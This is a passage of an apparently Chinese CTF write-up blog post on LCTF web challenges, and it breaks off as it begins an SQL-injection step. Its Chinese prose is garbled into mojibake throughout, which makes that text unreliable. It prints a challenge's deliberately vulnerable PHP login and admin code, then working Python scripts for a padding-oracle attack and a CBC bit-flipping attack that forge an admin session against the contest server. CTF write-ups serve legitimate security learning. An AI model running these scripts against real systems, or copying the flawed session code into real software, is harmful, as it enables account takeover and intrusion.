    <content type="html"><![CDATA[<p>å‘¨æœ«åˆšåˆšç»“æŸçš„LCTFï¼Œæˆ‘ä»¬é˜Ÿä¸€å…±åšå‡ºäº†4é“webï¼Œä¸€é“miscè¿˜æœ‰ä¸€é“é—®å·è°ƒæŸ¥ï¼ˆå¥½æ°”å•Šæ²¡æŠ¢åˆ°ä¸€è¡€æ¢pwnhubé‚€è¯·ç ï¼‰ï¼Œæ„Ÿè°¢<code>åƒé¥­å»</code>å¤§ä½¬å¸¦é£~<br><a id="more"></a></p>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¯¹æœ¬æ¸£æ¸£è€Œè¨€ï¼Œæœ¬æ¬¡æ¯”èµ›è´¨é‡è¿˜æ˜¯ä¸é”™çš„ï¼Œæˆ‘ä»¬é˜Ÿåšå‡ºçš„å››é“webå°±æ¶‰åŠåˆ°äº†<code>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</code>ã€<code>PaddingOracleæ”»å‡»</code>ã€<code>sprintfæ ¼å¼åŒ–æ³¨å…¥</code>ã€<code>sqlæŠ¥é”™æ³¨å‡ºåº“åè¡¨å</code>ã€<code>joinæ³¨å…¥å‡ºåˆ—å</code>ã€<code>orderbyæ— è¡¨åæ³¨å…¥æ•°æ®</code>ã€<code>SSRFç»•è¿‡</code>ã€<code>æ¡ä»¶ç«äº‰</code>ã€<code>7ä¸ªå­—ç¬¦å†…getshell</code>ç­‰çŸ¥è¯†ï¼Œæ”¶è·é¢‡ä¸°<br>ä¸‹é¢æ˜¯4é“webçš„WriteUp</p>
<h1 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h1><p>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="noopener">http://111.231.111.54/</a></p>
<h2 id="0x00è·å–æºç "><a href="#0x00è·å–æºç " class="headerlink" title="0x00è·å–æºç "></a>0x00è·å–æºç </h2><p>æ‰«ä¸€ä¸‹å‘ç°å­˜åœ¨<code>.login.php.swp</code>å’Œ<code>.admin.php.swp</code>æ³„éœ²<br><code>vim -r login.php</code>æ¢å¤åå¯ä»¥æŸ¥çœ‹æºç <br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="login"&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;åå°ç™»å½•&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</span><br><span class="line">  		get_identity();</span><br><span class="line">  		header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(test_identity())&#123;</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_page();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$title = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">	$result = mysql_query($sql,$con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;adminpage&lt;/title&gt;</span><br><span class="line">	&lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;nav class="navbar navbar-default" role="navigation"&gt;</span><br><span class="line">   &lt;div class="navbar-header"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="#"&gt;åå°&lt;/a&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div&gt;</span><br><span class="line">      &lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;ç¼–è¾‘æ–‡ç« &lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;è®¾ç½®&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;&lt;/nav&gt;</span><br><span class="line">   &lt;div class="panel panel-success"&gt;</span><br><span class="line">   &lt;div class="panel-heading"&gt;</span><br><span class="line">      &lt;h1 class="panel-title"&gt;æ–‡ç« åˆ—è¡¨&lt;/h1&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div class="panel-body"&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°è¿™é“é¢˜åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ç®¡ç†å‘˜ç™»å½•ï¼Œç¬¬äºŒéƒ¨åˆ†å¤§æ¦‚ç‡æ˜¯ä¸ªæ³¨å…¥</p>
<h2 id="0x01ç®¡ç†å‘˜ç™»å½•"><a href="#0x01ç®¡ç†å‘˜ç™»å½•" class="headerlink" title="0x01ç®¡ç†å‘˜ç™»å½•"></a>0x01ç®¡ç†å‘˜ç™»å½•</h2><p>æµ‹è¯•å‘ç°<code>admin=123&amp;password[]=111</code>æˆ–è€…ç›´æ¥<code>å¼±å£ä»¤adminã€admin</code>å¯ä»¥ç›´æ¥ç™»å½•å¹¶è·³è½¬åˆ°<code>admin.php</code>ï¼Œä½†æ˜¯å´æç¤ºä¸æ˜¯çœŸæ­£çš„adminï¼ŒæŸ¥çœ‹admin.phpæºç ï¼Œå‘ç°åªæœ‰<code>$_SESSION[&#39;isadmin&#39;]</code>å­˜åœ¨æ—¶ï¼Œæ‰ç®—çœŸæ­£çš„ç®¡ç†å‘˜<br>è€Œlogin.phpä¸­æœ‰å…³sessionçš„æ“ä½œï¼Œå°±æ¶‰åŠåˆ°<code>get_identity()</code>å’Œ<code>test_identity()</code>ä¸¤ä¸ªå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸¤ä¸ªå‡½æ•°å’Œ2017NJCTFçš„ä¸€é“cbcå­—èŠ‚ç¿»è½¬é¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘å‚è€ƒäº†<a href="http://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">Pr0ph3t</a>å¤§ä½¬çš„æ–‡ç« ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„token(IV)è¿›è¡Œ<code>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</code>ï¼Œä½¿å¾—æœåŠ¡å™¨è§£å‡ºæ¥çš„æ˜æ–‡ä¸º<code>admin</code>ï¼Œ<br>ä½†æ˜¯è¿™é‡Œä¸çŸ¥é“ <code>id</code>çš„å€¼<br>å†å‚è€ƒ<a href="http://www.freebuf.com/vuls/98156.html" target="_blank" rel="noopener">FreeBuff</a>çš„è¿™ç¯‡æ–‡ç« ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„tokenï¼Œä¹Ÿå°±æ˜¯IVï¼Œåˆ©ç”¨<code>test_identity()</code>å‡½æ•°å¯¼è‡´çš„é¡µé¢è¿”å›ä¸åŒè¿›è¡Œ<code>PaddingOracleæ”»å‡»</code>ï¼Œä»è€Œæ¨å¯¼å‡ºä¸­é—´å€¼ï¼Œç„¶åæ±‚å‡ºæ˜æ–‡ï¼Œä¹Ÿå°±æ˜¯<code>id</code><br>æ€»ç»“ä¸€ä¸‹ï¼Œç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬è¦åšçš„æœ‰ä»¥ä¸‹è¿™å‡ æ­¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.å¼±å£ä»¤ç™»å½•</span><br><span class="line">2.PaddingOracleæ”»å‡»å¾—åˆ°id</span><br><span class="line">3.CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ä¼ªé€ æˆçœŸæ­£çš„admin</span><br></pre></td></tr></table></figure></p>
<p>PaddingOracleæ”»å‡»è„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#by:CodeMonster</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r1</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"http://111.231.111.54/login.php"</span></span><br><span class="line">token=base64.b64decode(<span class="string">"N2ZtWmZjSWJmaUtRNFNSeg=="</span>)</span><br><span class="line">id=<span class="string">''</span></span><br><span class="line">idhex=<span class="string">''</span></span><br><span class="line">n=<span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">        ok=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> flag:</span><br><span class="line">            ok+=chr((j+<span class="number">1</span>)^ord(k))</span><br><span class="line">        ss=(<span class="number">15</span>-j)*<span class="string">'\x00'</span>+chr(i)+ok</span><br><span class="line">        s=base64.b64encode(ss)</span><br><span class="line">        header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=0t4h76nv16i4m61noh2gli2nd5; token="</span>+s+<span class="string">";"</span>&#125;</span><br><span class="line">        r2=r1.get(url,headers=header)</span><br><span class="line">        <span class="comment">#print r2.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="comment">#print (i^(j+1)),i,j</span></span><br><span class="line">            flag=chr(i^(j+<span class="number">1</span>))+flag</span><br><span class="line">            id=chr((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+id</span><br><span class="line">            idhex=hex((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+<span class="string">"-"</span>+idhex</span><br><span class="line">            <span class="keyword">print</span> j,id</span><br><span class="line">            <span class="keyword">print</span> j,idhex</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>å…¶ä¸­tokenå’Œcookieè¦ä¿®æ”¹æˆç¬¬ä¸€æ­¥ç™»å½•æˆåŠŸåçš„tokenå’Œcookieï¼Œæœ€åèƒ½æ±‚å‡º14ä½idå’Œä¸€ä½0x01ï¼Œå¯ä»¥çˆ†ç ´æœ€åä¸€ä½</p>
<p>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#by:CodeMonster</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">dic = open(<span class="string">"passsss.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    source_str = chr(i)+<span class="string">'EZKIhn1dPhWY2P'</span>+<span class="string">'\x01'</span></span><br><span class="line">    target_srt = <span class="string">'admin'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">    token = <span class="string">'cWMzdTJQMUxGSmJSRmt5Vw=='</span> <span class="comment">#ä½ è·å¾—çš„åˆå§‹IVçš„base64encodeå€¼</span></span><br><span class="line">    token = list(b64.b64decode(token))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,len(target_srt)):</span><br><span class="line">        token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line">    sss=b64.b64encode(<span class="string">''</span>.join(token))</span><br><span class="line">    dic.write(<span class="string">""</span>.join(sss))</span><br><span class="line">    dic.write(<span class="string">""</span>.join(<span class="string">"\n"</span>))</span><br><span class="line">dic.close()</span><br></pre></td></tr></table></figure><br>ç„¶åå»burpsuiteé‡Œçˆ†ç ´tokenå°±å¥½ï¼Œå³å¯ç™»å½•ä¸ºç®¡ç†å‘˜</p>
<h2 id="0x02sqlæ³¨å…¥"><a href="#0x02sqlæ³¨å…¥" class="headerlink" title="0x02sqlæ³¨å…¥"></a>0x02sqlæ³¨å…¥</h2><p>è¿™éƒ¨åˆ†çš„æ ¸å¿ƒä»£ç ä¸»è¦æ˜¯è¿™å‡ å¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> $id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">	$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">	$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$title = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">$result = mysql_query($sql,$con);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°ç”¨äº†sprintfæ 